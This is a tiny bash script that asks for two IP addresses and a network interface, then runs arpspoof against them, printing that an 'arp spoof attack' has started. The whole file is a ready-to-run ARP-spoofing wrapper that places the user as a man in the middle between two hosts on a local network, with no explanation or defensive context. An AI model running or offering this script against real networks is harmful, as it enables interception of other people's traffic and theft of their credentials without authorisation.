echo "Enter the first ip : "
read first
echo "Enter the second ip : "
read second
echo "Enter the interface card : " 
read interface
echo "arp spoof attack started by apspoof ..." 
arpspoof -i $interface -t $first $second 

